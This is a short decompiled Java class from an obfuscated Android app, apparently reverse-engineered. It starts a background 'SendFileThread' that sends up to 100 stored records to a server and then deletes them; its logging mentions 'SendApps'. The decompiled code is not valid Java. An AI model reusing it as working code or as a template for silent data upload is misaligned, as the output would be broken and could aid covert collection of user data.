package com.app.system.common.f;

import android.content.Context;
import com.app.system.common.d.a.d;
import com.app.system.common.h;
import java.util.List;

public class c
  extends a
{
  public static void k(Context paramContext)
  {
    try
    {
      Thread local1 = new com/app/system/common/f/c$1;
      local1.<init>("SendFileThread", paramContext);
      local1.start();
    }
    catch (Exception paramContext)
    {
      com.security.d.a.a("SendApps", "sendDataToServer()", new Object[] { paramContext });
    }
  }
  
  private static void m(Context paramContext)
  {
    com.app.system.common.h.c localc = new com.app.system.common.h.c(paramContext);
    List localList = localc.a(100);
    if ((localList != null) && (localList.size() != 0))
    {
      if (new d(h.c(paramContext)).a(paramContext, localList) == 1) {
        localc.a(localList);
      }
      return;
    }
  }
}


/* Location:              ~/com/app/system/common/f/c.class
 *
 * Reversed by:           J
 */